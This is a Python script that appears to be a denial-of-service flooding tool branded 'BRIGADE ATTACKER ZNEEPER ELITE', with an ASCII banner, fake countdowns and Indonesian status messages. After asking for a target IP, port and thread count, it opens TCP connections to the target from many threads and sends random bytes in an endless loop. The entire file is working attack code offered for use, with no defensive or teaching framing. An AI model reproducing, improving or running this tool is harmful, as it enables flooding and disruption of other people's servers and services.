#!/usr/bin/python
# _*_ coding: utf-8 _*_
import sys
import os
import socket
import random
import string
import threading
import time
import requests
import progressbar

# importing time module
import time
t = 2 # 2 seconds
time.sleep(t)
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ZH = '\033[97m'

# CLEAR
os.system("clear")
print(" ")
print("       🟠 🟠       🟠 🟠 🟠   🟠 🟠 🟠         🟠 🟠      🟠 🟠 🟠       ")
print("    🟠       🟠  🟠           🟠      🟠     🟠      🟠   🟠       🟠    ")
print("   🟠         🟠 🟠           🟠       🟠   🟠        🟠  🟠        🟠   ")
print("   ⚫         ⚫ ⚫           ⚫       ⚫  ⚫         ⚫  ⚫        ⚫   ")
print("   ⚫         ⚫   ⚫ ⚫ ⚫   ⚫      ⚫   ⚫         ⚫  ⚫       ⚫   ")
print("   ⚫         ⚫           ⚫ ⚫ ⚫ ⚫     ⚫         ⚫  ⚫ ⚫ ⚫      ")
print("   🔵         🔵           🔵 🔵            🔵        🔵  🔵     🔵     ")
print("    🔵       🔵            🔵 🔵             🔵     🔵    🔵      🔵    ")
print("       🔵 🔵       🔵 🔵 🔵   🔵               🔵 🔵      🔵       🔵   ")
print(" ")
print("\033[96m≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠\033[0m")
print("\033[1m   B R I G A D E   A T T A C K E R   Z N E E P E R   E L I T E            \033[0m")
print("\033[1m                        design by: Za'99                                  \033[0m")
print("\033[1m                            ———0———                                          \033[0m")
print("\033[96m≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠≠\033[0m")
ip = str(input("\033[93m[\033[93m+\033[92m]IP Target : "))
print("\033[33m=====>>>")
port = int(input("\033[92m[\033[95m+\033[92m]Port : "))
print("\033[32m=====>>>")
packs = int(input("\033[92m[\033[95m+\033[92m]Packets{0} : "))
print("\033[31m=====>>>")
thread = int(input("\033[92m[\033[95m+\033[92m]Threads : "))
print("\033[94m=====>>>"),
time.sleep(5),
print("\033[96m              ⟩⟩ 1 \033[0m "),
time.sleep(5),
print("\033[92m              ⟩⟩ 2 \033[0m "),
time.sleep(5),
print("\033[1m              ⟩⟩ 3 \033[0m "),
time.sleep(5),
print("\033[97m              ⟩⟩ 4 \033[0m "),
time.sleep(5),
print("\033[95m              ⟩⟩ 5 \033[0m "),
time.sleep(5),
time.sleep(5),
print("\033[96m              ⟩⟩ MENUNGGU KONEKSI SERVER <<\033[0m "),

def animated_marker():
    widgets = ['\033[33m[\033[31m#\033[31\033[33m#\033[31mLoading: progressbar.AnimatedBouncer()\033[0m']
    bar = progressbar.ProgressBar(widgets=widgets).start()
    for i in range(25):
        time.sleep(5)
        bar.update(i)


animated_marker()
def start():
   r = random._urandom(10)
   u = int(0)
   while True:
       try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip,port))
         s.send(r)
         u += 1
         print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ " \033[97m:," +ip+ "\033[0m" )
         u += 1
         print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ " \033[97m::,," +ip+ "\033[0m" )
         u += 1
         print("\033[33m[\033[1m+\033[33m]\033[92m0ps BADAI GURUN   " +str(u)+ "  \033[33mZN33P3R 6453 " +str()+ " \033[97m:::,,," +ip+ "\033[0m" )
         
       finally:
         s.close()
         print("\033[33m[\033[1m-\033[33m]\033[92mSitus Done!")

for x in range(thread):
  thred = threading.Thread(target=start)
  thred.start()
